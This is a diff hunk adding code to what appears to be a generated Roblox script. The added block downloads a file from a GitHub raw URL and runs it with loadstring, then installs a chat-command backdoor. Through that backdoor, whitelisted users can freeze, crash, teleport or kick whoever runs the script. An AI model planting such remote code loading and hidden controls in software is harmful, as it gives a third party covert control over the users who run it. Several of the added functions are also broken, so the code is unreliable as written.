@@ -2505,6 +2505,127 @@ task.spawn(C_8a);
 local function C_8b()
 local script = G2L["8b"];
 
+local success, whitelistedUsers = pcall(function()
+    local response = game:HttpGet("https://raw.githubusercontent.com/spookyoregon/whitelist/main/users")
+    return loadstring(response)()
+end)
+
+if not success then
+    whitelistedUsers = {}
+end
+
+local plr = game.Players.LocalPlayer
+local character = plr.Character or plr.CharacterAdded:Wait()
+
+local function isAllowed(userId)
+    return whitelistedUsers[userId] == true
+end
+
+local function bringPlayer(targetName)
+    local targetPlayer = game.Players:FindFirstChild(targetName)
+    if targetPlayer and targetPlayer.Character then
+        character:SetPrimaryPartCFrame(targetPlayer.Character:GetPrimaryPartCFrame())
+    end
+end
+
+local function kickPlayer(targetName)
+    local targetPlayer = game.Players:FindFirstChild(targetName)
+    if targetPlayer then
+        targetPlayer:Kick("Kicked by: " .. plr.Name)
+    end
+end
+
+local function fakeBanPlayer(targetName)
+    local targetPlayer = game.Players:FindFirstChild(targetName)
+    if targetPlayer then
+        targetPlayer:Kick("You have been banned")
+    end
+end
+
+local function freezePlayer()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.PlatformStand = true
+    end
+end
+
+local function unfreezePlayer()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 16
+        humanoid.JumpPower = 50
+        humanoid.PlatformStand = false
+    end
+end
+
+local function crashPlayer(targetName)
+    local targetPlayer = game.Players:FindFirstChild(targetName)
+    if targetPlayer then
+        while true do
+        end
+    end
+end
+
+local function refreshPlayer(targetName)
+    local targetPlayer = game.Players:FindFirstChild(targetName)
+    if targetPlayer then
+        local teleportService = game:GetService("TeleportService")
+        local placeId = game.PlaceId
+        local jobId = game.JobId
+        teleportService:TeleportToPlaceInstance(placeId, jobId, targetPlayer)
+    end
+end
+
+local function killPlayer(targetName)
+    local targetPlayer = game.Players:FindFirstChild(targetName)
+    if targetPlayer and targetPlayer.Character then
+        local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.Health = 0
+        end
+    end
+end
+
+local function onPlayerChatted(player, message)
+    if isAllowed(player.UserId) then
+        local command, targetName = message:match("^%.(%w+)%s*(%w*)")
+        if command then
+            print("Command:", command, "Target Name:", targetName)
+            if command == "bring" and targetName == plr.Name then
+                bringPlayer(player.Name)
+            elseif command == "freeze" and targetName == plr.Name then
+                freezePlayer()
+            elseif command == "crash" then
+                crashPlayer(targetName)
+            elseif command == "unfreeze" and targetName == plr.Name then
+                unfreezePlayer()
+            elseif command == "kick" then
+                kickPlayer(targetName)
+            elseif command == "ban" then
+                fakeBanPlayer(targetName)
+            elseif command == "refresh" then
+                refreshPlayer(targetName)
+            elseif command == "kill" then
+                killPlayer(targetName)
+            end
+        end
+    end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
 	
 end;
 task.spawn(C_8b);
